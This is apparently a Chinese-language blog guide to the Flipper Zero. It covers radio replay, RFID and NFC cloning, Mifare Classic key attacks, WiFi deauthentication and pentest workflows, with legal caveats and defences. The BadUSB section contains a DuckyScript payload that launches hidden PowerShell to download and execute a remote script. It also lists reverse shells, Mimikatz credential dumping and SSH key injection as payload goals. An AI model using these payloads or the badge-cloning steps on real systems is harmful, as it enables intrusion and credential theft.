---
title: "Flipper Zero：黑客与创客完整指南"
draft: false
toc: true
date: 2023-05-26
lastmod: 2026-11-27
description: "Flipper Zero 指南，涵盖无线电、协议、固件、GPIO、BadUSB、测试流程、法律限制和配件。"
genre: ["硬件黑客", "网络安全", "渗透测试", "无线安全", "红队"]
tags: ["Flipper Zero", "硬件黑客", "Sub-GHz", "NFC", "RFID", "红外", "iButton", "BadUSB", "GPIO", "Bluetooth", "Unleashed 固件", "Xtreme 固件", "RogueMaster", "WiFi 开发板", "渗透测试", "红队", "无线安全", "RFID 克隆", "Mifare Classic", "EM4100", "HID Prox", "重放攻击", "暴力破解", "Flipper Zero 配件", "开源", "安全审计", "物理安全", "社会工程", "CTF", "Flipper Zero 固件", "Flipper Zero 应用", "Sub-GHz 重放", "U2F", "Flipper Zero 合法性", "频率分析", "UART 黑客技术", "SPI", "I2C", "JTAG", "SWD", "Flipper Zero GPIO 接口", "Flipper Zero WiFi 功能", "Flipper Zero Bluetooth 功能", "Flipper Zero NFC 功能", "Flipper Zero RFID 功能", "Flipper Zero 红外", "Flipper Zero 2026 指南"]
cover: "/img/cover/A_colorful_illustration_of_a_Flipper_Zero_device.webp"
coverAlt: "Flipper Zero 设备周围环绕着各种工具和无线信号的彩色插画，展现其多功能性和能力"
coverCaption: ""
---

**Flipper Zero** 是实用安全社区中最知名的多功能工具。它可以装进口袋，售价约 170 美元，并在小巧到足以挂在钥匙扣上的设备中集成了 Sub-GHz 无线电、125 kHz RFID 读卡器、NFC 天线、红外收发器、iButton 接口、Bluetooth 无线电、GPIO 扩展接口和 USB 端口。本指南深入介绍它的各项能力，从开箱使用到高级红队工作流程。

*如果你刚开始使用 Flipper Zero，请按顺序阅读各节。若你已经拥有设备并想深入了解某个子系统，可直接跳到相应部分。*

## 硬件概览

**Flipper Zero** 使用 STM32WB55 微控制器。这款双核 Arm Cortex-M4 / Cortex-M0+ 芯片集成了 Bluetooth 5.0 无线电。主应用在 M4 核心上运行，最高频率为 64 MHz。M0+ 核心负责处理 Bluetooth 协议栈。

| 组件 | 详细信息 |
|-----------|---------|
| **MCU** | STM32WB55RGV6，Cortex-M4，64 MHz + Cortex-M0+ |
| **闪存** | 1 MB 内置 + 256 Mbit 外置 SPI NOR |
| **RAM** | 256 KB SRAM |
| **显示屏** | 1.4 英寸电子纸屏（128x64），常亮 |
| **Sub-GHz 无线电** | CC1101 收发器，300–928 MHz |
| **RFID** | 125 kHz 模拟前端（EM4100、HID、Indala 等） |
| **NFC** | ST25R3916B，13.56 MHz ISO 14443A/B 和 15693 |
| **红外** | 940 nm 发射 LED + TSOP75338 接收传感器 |
| **iButton** | 1-Wire 接口，DS1990A 和触碰式存储钥匙 |
| **Bluetooth** | BLE 5.0（集成于 STM32WB55） |
| **GPIO** | 18 针接口：SPI、I2C、UART、5V/3.3V 电源、ADC |
| **USB** | USB-C，支持 HID 设备（BadUSB / U2F） |
| **电池** | 2000 mAh 锂聚合物电池，USB-C 充电，典型使用约 30 小时 |
| **MicroSD** | 最大 128 GB，FAT32 或 exFAT |

**电子纸显示屏**显示静态图像时不耗电。因此，即使设备一直处于待机状态，电池续航也十分出色。

**CC1101** 是 Texas Instruments 的通用 Sub-GHz 收发芯片，覆盖 300–348 MHz、387–464 MHz 和 779–928 MHz 频段。它支持编程，因此 Sub-GHz 模块十分灵活。

## 固件选项

你可以运行 **Flipper Zero 官方固件**，也可以选择几种流行的社区分支。每个分支都会开放 Flipper Devices 因法规和法律原因而限制的功能。

| 固件 | 描述 | 主要解锁功能 |
|----------|-------------|-------------|
| **Official** | Flipper Devices 发布的标准固件 | 保守且安全性最高的默认设置 |
| **Unleashed** | 最受欢迎、注重稳定性的分支 | 全部 Sub-GHz 频率及额外协议 |
| **Xtreme** | 功能丰富并持续维护 | 自定义界面、额外应用、Sub-GHz 解锁 |
| **RogueMaster** | 集成大量第三方应用 | 开箱即用的最大应用套件 |

你可以在 Windows、macOS 或 Linux 上通过桌面应用 **qFlipper** 刷入分支固件，也可以把 `.dfu` 文件复制到 SD 卡，然后使用设备的更新菜单。

*Unleashed 是开展研究最安全的起点。想要最多功能的用户通常选择 Xtreme。旅行时可运行官方固件，以减少受到法律审查的可能。*

## Sub-GHz 无线电

Sub-GHz 模块最受关注。它能记录、分析、重放并发射车库门、汽车钥匙遥控器、门铃、无线气象站、电源插座和数百种其他设备所用频段的信号。

### 支持的频率范围

- **300–348 MHz** — 较旧的遥控器和美国部分车库门系统
- **387–464 MHz** — 欧洲和美国设备；433.92 MHz 是全球最常见的 ISM 频段
- **779–928 MHz** — 欧洲 868 MHz、美国 ISM 频段 915 MHz，以及 868 MHz LoRa

### 常见调制方式

| 调制方式 | 含义 |
|------------|---------------|
| **AM (ASK/OOK)** | 幅移键控，简单的开/关信号，多数普通遥控器使用这种方式。 |
| **FM (FSK/2-FSK)** | 频移键控，气象站和部分汽车钥匙遥控器会使用。 |
| **APSK** | 组合调制，少数智能设备使用。 |

Flipper 可以自动解码原始 OOK 信号，在屏幕上直观显示，并允许一键重放。这也是 Flipper Zero 出名的原因：对于不使用滚动码的设备，**重放静态码非常容易**。

### 滚动码与静态码

**静态码**设备每次发送相同信号。Flipper Zero 记录一次后便可随时重放。几乎所有廉价无线电源插座、门铃和较旧的车库门系统都使用静态码。

**滚动码**设备（KeeLoq、AUT64 等）每次使用后都会更换代码。捕获到的信号不能直接重放。攻击滚动码系统更复杂，需要专用工具和近距离时序配合。Flipper Zero 开箱后无法破解现代滚动码。

*只测试自己拥有的设备。自家使用静态码的设备非常适合作为学习目标。*

### Sub-GHz 工作流程

1. 在主菜单中打开 **Sub-GHz**。
2. 选择 **Read** (读取并捕获信号的选项) 捕获信号。将设备对准遥控器并按下遥控器按钮。
3. Flipper 解码信号并显示频率、调制方式和原始比特模式。
4. 按 **Save** (保存信号的选项) 将信号保存到 SD 卡。
5. 按 **Send** (重新发送信号的选项)，或稍后打开保存的文件，重新发送信号。

**Frequency Analyzer**（频率分析器）模式可被动扫描频谱并查看哪些频率处于活动状态，适合查找未知发射器。

### 暴力破解攻击

对于密钥空间较小的协议，例如只使用 12 位或 24 位静态码的旧式遥控器，Flipper 可以运行**暴力破解**序列，逐一尝试所有可能的代码。这对非常老旧或廉价的设备有效，但对滚动码或大型密钥空间完全无效。

定制固件包含额外的暴力破解字典和一些针对特定制造商的攻击序列。常见序列包括 **Came 12bit**、**Nice 12bit**、**Linear 8bit** 和 **Holtek 12bit**。

## RFID（125 kHz 低频）

**125 kHz RFID** 模块可读写低频门禁卡。这些卡片和钥匙扣常用于较旧的门禁系统、动物微芯片标签和工业追踪。

### 支持的卡片类型

| 卡片类型 | 说明 |
|-----------|-------|
| **EM4100 / EM4102** | 最常见，64 位，只读。全球廉价门禁系统普遍使用。 |
| **HID Prox** | 商业门禁系统常用（HID Global H10301 及其变体）。 |
| **Indala Prox** | 较旧系统使用的 Motorola / Indala 格式。 |
| **IoProx** | Kantech IoProx，在北美商业建筑中也很常见。 |
| **FDX-B (ISO 11784/11785)** | 动物微芯片标准。 |
| **Pyramid** | Farpointe Data 产品，与 Indala 类似。 |
| **Viking** | 较少见，部分欧洲系统使用。 |

### 读取低频卡

将 Flipper 顶部边缘（天线所在位置）靠近卡片或钥匙扣，距离几厘米。进入 **125 kHz RFID > Read**（读取 RFID 卡的菜单路径）。Read（读取）选项会读取低频卡并显示其 ID。设备会在一到两秒内读取 ID，并显示场所代码和卡号。

### 模拟与克隆

读卡后，你可以保存卡片，之后选择保存的文件并按下按钮来**模拟**它。Flipper 会广播卡片 ID，让读卡器将其识别为原卡。

你也可以将 ID **写入**一张空白的可写 T5577 卡。T5577 卡价格低廉（每张约 0.50 美元），支持大多数低频格式。

*在大多数司法辖区，克隆自己不拥有或无权测试的门禁卡属于刑事犯罪。测试任何门禁系统前，务必取得书面授权。*

### 低频 RFID 的限制

低频 RFID 没有加密保护。附近任何持有读卡器的人都能读取你的卡片 ID。现代物理安全系统改用高频智能卡（13.56 MHz NFC）和双向认证。

## NFC（13.56 MHz 高频）

**NFC 模块**使用 ST25R3916B 芯片，支持 ISO 14443A、ISO 14443B 和 ISO 15693。非接触式支付卡、交通卡、楼宇门禁智能卡和 NFC 标签都使用这一频率。

### 支持的标准

| 标准 | 常见用途 |
|----------|-----------|
| **ISO 14443A** | Mifare Classic、Mifare DESfire、NXP NTAG、信用卡和借记卡 |
| **ISO 14443B** | 部分政府身份证件和护照（外层） |
| **ISO 15693** | 图书馆标签和部分工业 RFID |
| **EMV（1 级）** | 只读非接触式支付卡元数据 |
| **NFC-A/B/F/V**（NFC 协议） | 通用 NFC 数据交换 |

### Mifare Classic 攻击

**Mifare Classic** 是一种 13.56 MHz 智能卡标准，理论上已于 2008 年被破解。许多较旧的交通和楼宇门禁系统仍在使用它。Flipper Zero 可执行多种攻击：

- **Read**（读取）— 读取使用出厂默认密钥（`FFFFFFFFFFFF` 或 `A0A1A2A3A4A5`）的所有扇区。
- **字典攻击** — 用常见密钥列表尝试解锁受保护的扇区。定制固件内含大型密钥字典。
- **Nested 攻击** — 至少需要知道一个扇区密钥；通过基于时序的密码分析推导其他扇区密钥。
- **Darkside 攻击** — 某些版本的 Mifare Classic 即使没有已知密钥也能攻击。Flipper 必须放在距卡片一厘米以内。

读取所有扇区后，你可以保存完整转储并**模拟**卡片。Flipper 会模拟原卡，包括扇区数据。

*如果 Mifare Classic 卡中有当前余额（如交通费或停车额度），除非你同时拥有该卡并控制其后台系统，否则不要克隆。*

### Mifare DESfire 与现代卡片

**Mifare DESfire EV1/EV2/EV3** 卡使用 AES-128 加密和双向认证。Flipper Zero 无法读取受保护的数据。它可以读取卡片 UID 和 AID 列表，但没有正确密钥便无法访问任何应用数据。这是设计使然，DESfire 具备可靠的安全性。

**EMV 支付卡**，包括非接触式 Visa、Mastercard 和 Amex，可以读取公开元数据（旧卡的卡号、到期日期、交易记录）。现代卡片减少了公开读取所返回的数据。Flipper 无法发起或拦截实际支付交易。

### NFC 标签与 NDEF

**NDEF（NFC Data Exchange Format）** 是营销、产品认证和智能标签所用 NFC 标签的标准格式。Flipper 能读取、保存、写入和模拟 NDEF 标签。可用于：

- 为测试克隆 NXP NTAG203 或 NTAG213 标签
- 写入自定义 NDEF 负载（URL、联系人卡片、Wi-Fi 凭据）
- 模拟标签，在没有实体标签时触发手机操作

## 红外（IR）

红外模块由一个用于发射的 940 nm LED 和一个用于接收的 TSOP75338 解调器组成，几乎支持所有消费级红外遥控协议。

### 支持解码的协议

| 协议 | 常见设备 |
|----------|---------------|
| **NEC** | 最常见，LG、Samsung、Panasonic 等使用 |
| **RC5** | Philips 设备 |
| **RC6** | Philips、Microsoft 设备及有线电视盒 |
| **Samsung32** | Samsung 电视和家庭影院 |
| **NECext** | 带 32 位地址的扩展 NEC |
| **SIRC12 / SIRC15 / SIRC20** | Sony 设备 |
| **Kaseikyo** | Panasonic、JVC |
| **RCA** | RCA 品牌遥控器 |

Flipper 还可以捕获和重放它无法解码协议的**原始红外信号**。原始捕获会保存精确的脉冲与暂停时长，并以完整保真度重放。

### 通用遥控器

内置的 **Universal Remotes** 应用可浏览按品牌和设备类别整理的红外代码数据库。无需实体遥控器，你便可关闭电视、调节条形音箱音量或控制空调。GitHub 上由社区维护的红外库（`flipperzero-ir-relay`）还包含数千个额外代码。

*在红队或社会工程演练中，红外通用遥控器可在有可见屏幕的环境中制造干扰。*

### 捕获自己的遥控器

1. 打开 **Infrared > Learn New Remote**（红外 > 学习新遥控器）。
2. 将原遥控器对准 Flipper 顶部的红外接收窗口。
3. 按下要捕获的每个按钮。Flipper 会分别保存每个按钮。
4. 为遥控器文件命名并保存。
5. 从保存的文件重放任意按钮。

## iButton 和 1-Wire

**iButton**（Dallas/Maxim 1-Wire）是一种接触式协议，用于部分物理门禁系统、资产追踪和温度感测。iButton 接触端是一个小金属圆片或圆柱体，需要触碰读卡器。

### 支持的钥匙类型

| 钥匙类型 | 说明 |
|----------|-------|
| **DS1990A** | 最常见的门禁钥匙；64 位唯一 ID，只读 |
| **DS1992** | 带 1 KB NVRAM 的存储钥匙 |
| **DS1996** | 带 64 KB NVRAM 的存储钥匙 |
| **Cyfral** | 东欧门禁系统格式 |
| **Metacom** | 较少见的对讲系统格式 |

读取钥匙时，将 Flipper 底边的 iButton 端口（金色触点）接触钥匙。按 RFID 和 NFC 的相同流程保存并模拟。Flipper 也可将密钥 ID 写入空白可写 RW1990 iButton 钥匙。

## GPIO 与硬件黑客技术

Flipper Zero 顶部的 **18 针 GPIO 接口**是硬件黑客的主要接口，可提供 SPI、I2C、UART、ADC 和电源线路。

### GPIO 引脚排列

| 引脚 | 功能 |
|-----|---------|
| **1** | 5V（输入，仅连接 USB 时供电） |
| **2, 4** | GND |
| **3** | 3.3V 输出（最大 20 mA） |
| **5** | PA4 / SPI1_MISO / ADC |
| **6** | PA6 / SPI1_SCK |
| **7** | PA7 / SPI1_MOSI |
| **8** | PA3 / UART TX |
| **9** | PB3 / UART RX |
| **10** | PC3 / ADC |
| **11** | PC1 / ADC |
| **12** | PA0 / ADC |
| **13** | PB2 / GPIO |
| **14** | PE3 / SPI1_CS |
| **15** | PB4 / I2C1_SDA |
| **16** | PB13 / I2C1_SCL |
| **17** | PB14 / GPIO / USART1 TX（调试） |
| **18** | PA8 / GPIO |

*所有 GPIO 引脚使用 3.3V 逻辑电平。不要向数据引脚施加 5V。连接 5V 设备时请使用电平转换器。*

### UART 控制台访问

许多嵌入式设备在量产后仍启用 UART 调试控制台。将 Flipper 的 UART 引脚连接到目标设备的 UART TX/RX 引脚后，你便可访问串行控制台，并可能：

- 进入特权 shell
- 从启动日志中查看凭据和系统信息
- 如果可以访问引导加载程序菜单，则刷入未签名固件

打开 **GPIO > USB-UART Bridge**（GPIO 菜单中的 USB 转 UART 桥接项），或使用 GPIO 应用建立终端连接。Flipper 会在已连接电脑上显示为 USB 串口，并在电脑和 UART 引脚之间转发数据。

### SPI 和 I2C 传感器

将任意 SPI 或 I2C 传感器（加速度计、气压传感器、温湿度传感器或 OLED 显示屏）直接连接到 GPIO 接口。社区已为许多常见芯片开发了应用：

- **SSD1306** OLED 显示屏驱动程序
- **BME280** 温度、湿度和气压传感器
- **NRF24L01** 2.4 GHz 无线电模块，可扩展无线攻击面
- **CC1101** 外置天线，可改善 Sub-GHz 通信范围

### JTAG 和 SWD 调试

Flipper GPIO 接口上的部分引脚提供 SWD 信号。配合适配器，你可以将 Flipper 用作 **JTAG/SWD 调试探针**，以便：

- 暂停目标 MCU 上的代码并逐步执行
- 读取和写入闪存
- 先通过电压毛刺攻击，再通过调试接口从锁定设备中提取固件

这是高级操作。移植到 Flipper 的 **BlackMagic Probe** 固件使这一工作流程切实可行。

{{< figure src="flipper-zero-gpio-uart-jtag-swd-hardware-attack-surface-diagram.webp" alt="Flipper Zero GPIO 接口示意图，展示连接目标嵌入式设备的 UART、SPI、I2C、JTAG 和 SWD 信号" >}}

## BadUSB 和 USB HID 攻击

通过 USB-C 连接电脑时，Flipper Zero 会枚举为一台 **USB HID 键盘**。这就是 BadUSB 攻击途径：设备无需安装驱动程序便会自动输入按键。

### DuckyScript

Flipper BadUSB 脚本使用 **DuckyScript**，与 Hak5 USB Rubber Ducky 使用的脚本语言相同。脚本是放在 SD 卡 `badusb/` 目录中的纯文本文件。

```
REM 打开运行对话框并启动 PowerShell
DELAY 500
GUI r
DELAY 300
STRING powershell -NoP -W Hidden -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
ENTER
```

常见 BadUSB 负载：

- **反向 Shell** — 建立回连攻击者电脑的网络连接
- **凭据转储** — 在内存中运行 Mimikatz 或类似工具
- **持久化** — 添加启动项或计划任务
- **提取 Wi-Fi 密码** — 使用 `netsh` 导出已保存的无线配置文件
- **注入 SSH 密钥** — 将攻击者密钥添加到 `authorized_keys`

### BadUSB 防护

BadUSB 攻击之所以有效，是因为电脑默认信任键盘。防护措施包括：

- **USBGuard**（Linux）— 按供应商/产品 ID 将特定 USB 设备列入允许名单
- **USB 锁定组策略**（Windows）— 禁用未列入允许名单的供应商所生产的 HID 设备
- **物理端口封锁器** — 防止在高安全级别环境中插入 USB 设备
- **端点检测** — CrowdStrike 等解决方案可通过启发式方法检测快速按键注入

### U2F 硬件令牌

Flipper Zero 还可充当 **FIDO U2F 硬件安全密钥**。官方固件包含 U2F 支持。你可在任何支持 FIDO U2F 的网站（GitHub、Google、Cloudflare 等）注册 Flipper，然后按下 Flipper 背面的按钮确认身份验证。

这样，Flipper 也可作为你个人账户的硬件令牌。私钥材料保存在 MCU 的安全存储区中。

## Bluetooth

STM32WB55 集成了 Bluetooth 5.0。Flipper 使用 BLE 来实现：

- **Flipper Mobile App** — 用于文件管理、固件更新和远程控制的 iOS 与 Android 应用
- **BadBT**（社区应用）— 通过 Bluetooth 而非 USB 输入 DuckyScript 按键，可针对已配对的 Bluetooth 主机进行无线 HID 注入
- **BLE 扫描器** — 被动扫描附近的 BLE 广播，可用于盘点建筑中的 IoT 设备

Bluetooth 通信范围不大，在开放空间约为 10–30 米。当你站在目标工作站附近时，足以从包或口袋中无线传输 BadUSB 负载。

### 配对移动应用

1. 从 App Store 或 Google Play 下载 **Flipper Mobile App**。
2. 在 Flipper 上进入 **Settings > Bluetooth > Pair Phone**（通过蓝牙配对手机的菜单）。
3. 打开应用并按提示完成配对。
4. 使用应用浏览 SD 卡、从目录安装应用并传输传感器数据。

## 深入了解定制固件

### Unleashed 固件

**Unleashed**（网址为 `github.com/DarkFlippers/unleashed-firmware`）是最保守的社区分支。它移除了 Sub-GHz 频率的地理限制，增加了对更多协议的支持，同时保持与官方代码库接近。稳定性是首要目标。

相较官方固件的主要新增功能：

- 扩展 Sub-GHz 频率范围（300–928 MHz，不受限制）
- 额外的 Sub-GHz 协议（CAME、Nice、DoorHan 等）
- 额外的 NFC 协议
- 扩展 BadUSB DuckyScript 支持
- 更大的红外数据库

### Xtreme 固件

**Xtreme**（网址为 `github.com/Flipper-XFW/Xtreme-Firmware`）在 Unleashed 功能之上增加了完整的自定义资源系统。你可以更改 Flipper 的名称、启动画面、桌面动画和 LED 行为。Settings 菜单也大幅扩展。

其他功能：

- App Hub，提供精选的第三方应用
- 扩展的 Sub-GHz 和 NFC 攻击负载
- RGB LED 脚本
- 文件管理改进

### RogueMaster

**RogueMaster** 集成了数量最多的第三方应用和社区工具，其中许多具有实验性质或在某些情境下存在风险。它不如 Unleashed 或 Xtreme 稳定，但一次安装即可获得最多工具。

### 刷入任意固件

```bash
# 使用 qFlipper CLI
qFlipper cli -c firmware /path/to/firmware.dfu

# 或将 firmware.zip 放到 SD 卡根目录，然后进入：
# Settings > Firmware Update > Update from SD Card（设置 > 固件更新 > 从 SD 卡更新）
```

*更新固件前务必备份 SD 卡内容。更新过程不会清除 SD 卡，但备份仍然是良好做法。*

## Flipper 应用生态

### 官方应用目录

**lab.flipper.net** 上的官方目录列出了可直接从移动应用安装的应用。类别包括：

- Sub-GHz 工具
- NFC 实用程序
- 游戏
- GPIO 传感器
- 开发者工具
- 音乐和娱乐

### 社区应用来源

- **flipc.org** — 按设备整理的社区数据库，收录 Sub-GHz 捕获信号、NFC 转储和红外数据库
- **awesome-flipperzero**（GitHub）— 精选应用、工具、脚本和硬件配件列表
- **UberGuidoZ Flipper**（GitHub）— 按协议和制造商整理的大型 Sub-GHz 捕获信号仓库

### 值得关注的第三方应用

| 应用 | 用途 |
|-----|---------|
| **Seader** | 使用支持 Wiegand 的模块读取智能卡 PACS 数据 |
| **POCSAG Pager** | 解码 152–160 MHz 的 POCSAG 寻呼消息 |
| **iButton Fuzzer** | 对 iButton 密钥空间进行暴力破解 |
| **NFC Playlist** | 自动轮换列表中的 NFC 卡片 |
| **T5577 Writer** | 将 EM4100/HID 数据写入空白 T5577 卡片 |
| **BLE Spam** | 向附近设备发送大量 BLE 广播数据包 |
| **ESP32 WiFi Marauder** | 在 ESP32 WiFi 开发板上控制 WiFi Marauder |
| **Metroflip** | 解析并显示交通卡数据 |
| **USB Mouse Jiggler** | 通过模拟 HID 鼠标移动保持屏幕唤醒 |

## 配件与硬件扩展

### WiFi 开发板

**WiFi Dev Board** 可直接插入 Flipper GPIO 接口。它包含一块运行 **WiFi Marauder** 固件的 ESP32-S2，可增加完整的 802.11 b/g/n 功能：

- **SSID 扫描** — 枚举附近所有接入点
- **Beacon 垃圾广播** — 广播数十个伪造 SSID 以迷惑客户端并制造可见干扰
- **解除认证攻击** — 发送 802.11 解除认证帧，使客户端与接入点断开连接
- **Probe 嗅探** — 捕获探测请求，从而识别设备及其记住的 SSID
- **WPS 攻击** — 扫描启用了 WPS 的路由器并尝试枚举 PIN（速度较慢）
- **PMKID 捕获** — 捕获 PMKID 哈希，以便在没有客户端的情况下离线破解

你可以通过 Flipper 的屏幕和按钮控制 WiFi 开发板，无需手机或电脑。

*在美国，针对非自有网络发送解除认证帧违反Computer Fraud and Abuse Act (CFAA)，多数国家也有类似法律。仅可在已授权的实验环境中使用。*

### 电子游戏模块

**Video Game Module** 内含 RP2040 和一块小型可充电电池。它可插入 GPIO 接口，增加无线多人游戏功能。它也可作为独立微控制器运行自定义代码，将部分处理任务从主 STM32 卸载。

### ESP32 WROOM 模块（DIY）

通过 UART 或 SPI 将标准 **ESP32-WROOM-32** 连接到 Flipper GPIO，可进一步扩大攻击面：

- 使用自定义固件实现完整的 802.11 Wi-Fi
- 以 2.4 GHz 同时运行 Bluetooth Classic 和 BLE，与 Flipper 自带 BLE 并行工作
- 外接 GPIO 扩展
- 在现场操作期间用于远程控制的 Web 服务器接口

### Raspberry Pi Zero 2W 接口适配器

社区设计的适配器可将 **Raspberry Pi Zero 2W** 连接到 Flipper GPIO 接口。Pi 可运行完整的 Linux 环境，并通过 UART 或 USB 串口与 Flipper 通信。可用于：

- 长时间记录数据
- 运行 Bettercap 或 Kismet 进行网络侦察
- 在红队行动中充当 C2 中继
- 存储可能会占满 microSD 卡的大型捕获数据

{{< figure src="flipper-zero-wifi-devboard-esp32-raspberry-pi-gpio-accessories-overview.webp" alt="Flipper Zero 硬件配件概览，包括 WiFi 开发板、ESP32 模块和 Raspberry Pi Zero GPIO 接口适配器" >}}

## 渗透测试工作流程

### 物理访问绕过工作流程

1. 在大厅自然接近员工时，使用 **125 kHz RFID 读卡器**读取员工门禁卡。
2. 将门禁卡克隆到空白 T5577 卡片，或直接用 Flipper 模拟。
3. 使用克隆卡进入受保护区域。
4. 记录哪些读卡器接受了克隆凭证，并向客户报告。

这可以测试场所使用的是 EM4100（不安全且可克隆）还是现代 NFC 智能卡（更难克隆）。

### 无线设备盘点

1. 启动 **Sub-GHz Frequency Analyzer**（Sub-GHz 频率分析器），巡视目标场所。
2. 记录所有活动频率和信号类型。
3. 使用 **Read** (读取并捕获信号的选项) 模式捕获并识别无线报警传感器、停车场栏杆和 HVAC 控制器等设备的信号。
4. 将所有使用静态码的设备报告为高严重性发现。

### RFID 检查

1. 使用 **NFC > Detect Reader** 模式，让 Flipper 模拟卡片并探测附近读卡器，无需携带任何凭证。
2. 识别读卡器类型（支持 Mifare Classic、DESfire 或 ISO 15693），评估每个门禁点的安全级别。

### BadUSB 遗留设备攻击模拟

1. 预先将 DuckyScript 负载放到 Flipper 的 SD 卡上。
2. 将 Flipper 留在一台已解锁的工作站上并保持连接。此步骤需要物理访问。
3. 脚本会自动执行：枚举主机、窃取凭据并建立回连。
4. 记录执行耗时和检测率。

此测试可评估组织的 USB 设备控制策略和端点检测覆盖范围。

### 无线报警传感器测试

许多无线门窗传感器会发送简单的 Sub-GHz OOK 信号。如果它们使用静态码：

1. 在已授权的测试环境中打开窗户触发传感器，并**记录**其信号。
2. **重放**该信号，模拟传感器触发，而无需实际打开窗户。
3. 检查报警系统是否发出警报。

这可以说明攻击者是否能使用一台 170 美元的设备绕过无线周界传感器。

{{< figure src="flipper-zero-penetration-testing-physical-access-rfid-badusb-workflow-diagram.webp" alt="Flipper Zero 渗透测试工作流程图，涵盖物理访问绕过、无线设备盘点、RFID 检查和 BadUSB 遗留设备攻击模拟" >}}

## CTF 与竞赛用途

Flipper Zero 会出现在**夺旗赛**的物理安全类别中。常见挑战包括：

- 克隆门禁卡，打开装有 flag 的上锁盒子
- 重放 Sub-GHz 信号，解锁模拟门
- 解码红外信号，找回隐藏消息
- 模拟 NFC 标签，以其他用户身份完成身份验证
- 使用 BadUSB 在有人值守的设备上执行负载

Flipper 内置的日志功能和大容量 SD 卡便于归档 CTF 活动期间收集的每个信号，供之后分析。

## 防御用途

安全团队使用 Flipper Zero 审计自己的环境：

- **卡片审计** — 读取场所中的每张门禁卡，识别应升级到 DESfire EV2 或更高版本的不安全 EM4100 或 Mifare Classic 系统。
- **无线设备审计** — 找出所有 Sub-GHz 设备并标记静态码系统。
- **BadUSB 策略测试** — 验证 USB HID 设备锁定策略是否有效。
- **红外遥控器审计** — 确认敏感设备无法通过红外通用遥控器控制。
- **NFC 标签可克隆性测试** — 确定产品或凭证上的 NFC 标签是否可被克隆。

## 法律与伦理注意事项

Flipper Zero 是正当的安全研究工具，但也可能被滥用。你的法律风险取决于司法管辖区和具体情况。

### 通常合法的行为（须获得授权）

- 测试自己拥有的设备
- 在签署的工作说明书授权下进行渗透测试
- 在受控实验室环境中开展安全研究
- 读取自己的门禁卡和遥控器
- 参加获准的 CTF 竞赛

### 通常违法的行为

- 重放非自有车库门信号以进入场所
- 克隆可进入未经授权楼宇的门禁卡
- 针对自己不控制的网络发送解除认证帧
- 未经书面授权对电脑使用 BadUSB
- 在多数司法管辖区内拦截私人通信（包括 Sub-GHz 通信）

在**美国**，相关法律包括Computer Fraud and Abuse Act (CFAA)、《电子通信隐私法》(ECPA)，以及美国联邦通信委员会 (FCC) 关于射频传输的规定。在**欧盟**，国家计算机犯罪法律和《无线电设备指令》提供类似保护。

*FCC 不禁止持有或使用可接收 Sub-GHz 信号的设备，但禁止在某些频率上进行未授权传输。多数消费级 Sub-GHz 设备使用免许可 ISM 频段（315 MHz、433 MHz、915 MHz），相关低功率通常符合 Part 15 限制。*

加拿大在 2024 年曾试图以汽车盗窃担忧为由阻止 Flipper Zero 进口。这主要是媒体报道汽车钥匙中继攻击后产生的政治反应，技术上并不严谨，因为现代汽车无钥匙进入系统使用滚动码，Flipper 无法在没有额外硬件的情况下破解。

{{< figure src="flipper-zero-legal-framework-authorized-vs-illegal-use-cases-us-eu-cfaa-guidelines.webp" alt="图表比较 Flipper Zero 在美国 CFAA 和欧盟计算机犯罪法律下的授权与违法用途，并列出常见示例" >}}

## 设置开发环境

### 构建官方固件

```bash
git clone --recursive https://github.com/flipperdevices/flipperzero-firmware.git
cd flipperzero-firmware

# 安装工具链（Linux/macOS）
./fbt

# 构建固件
./fbt fap_dist

# 通过 USB 刷写
./fbt flash_usb_full
```

**FBT（Flipper Build Tool）**会自动安装工具链、获取依赖并协调构建过程。你需要 Python 3.8+ 和 ARM GCC 交叉编译器。

### 编写自定义应用

应用采用 **Flipper Application Package (FAP)** 格式。每个应用位于 `applications_user/` 或 `applications/` 目录下。

```c
#include <furi.h>
#include <gui/gui.h>

static void my_app_draw_callback(Canvas* canvas, void* ctx) {
// 最小 FAP 框架；默认字体仅支持 ASCII，因此问候语保留为英文。
    canvas_draw_str(canvas, 10, 32, "Hello, Flipper!");
}

int32_t my_app_main(void* p) {
    UNUSED(p);
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, my_app_draw_callback, NULL);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    furi_delay_ms(3000);

    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_record_close(RECORD_GUI);
    return 0;
}
```

应用通过 **Furi**（Flipper Universal Registry Implementation）API 与 Flipper 硬件交互。子系统采用基于记录的访问方式：按名称打开记录，获取子系统指针，使用后关闭记录。

### SD 卡目录结构

Flipper 要求 SD 卡上存在特定目录：

| 目录 | 内容 |
|-----------|---------|
| `subghz/` | 已保存的 Sub-GHz 捕获文件（.sub 文件） |
| `nfc/` | 已保存的 NFC 转储文件（.nfc 文件） |
| `lfrfid/` | 已保存的低频 RFID 密钥（.rfid 文件） |
| `infrared/` | 已保存的红外遥控器（.ir 文件） |
| `ibutton/` | 已保存的 iButton 密钥（.ibtn 文件） |
| `badusb/` | DuckyScript 负载（.txt 文件） |
| `apps/` | 第三方 FAP 应用 |
| `music_player/` | .fmf 音乐文件 |
| `dolphin/` | Dolphin 经验值存档数据 |

## Flipper Zero 与其他设备对比

| 设备 | 价格 | Sub-GHz | NFC/RFID | 红外 | GPIO | 说明 |
|--------|-------|---------|----------|----|------|-------|
| **Flipper Zero** | ~$170 | 支持 (CC1101) | 支持（完整） | 支持 | 支持 | 综合能力最强 |
| **HackRF One**（软件定义无线电） | ~$350 | 支持 (SDR) | 不支持 | 不支持 | 有限 | 完整 SDR，覆盖范围宽得多，但无内置 NFC |
| **RTL-SDR** | ~$25 | 仅接收 | 不支持 | 不支持 | 不支持 | 最便宜的纯接收信号分析 SDR |
| **Proxmark3** | ~$300 | 不支持 | 支持（高级） | 不支持 | 有限 | RFID/NFC 分析更强，其他方面较弱 |
| **USB Rubber Ducky** | ~$60 | 不支持 | 不支持 | 不支持 | 不支持 | 仅支持 BadUSB，无无线功能 |
| **ChameleonMini** | ~$80 | 不支持 | 支持 | 不支持 | 有限 | 专用 NFC/RFID 模拟器 |
| **WiFi Pineapple** | ~$100 | 仅 WiFi | 不支持 | 不支持 | 不支持 | 专用于 802.11 攻击的平台 |

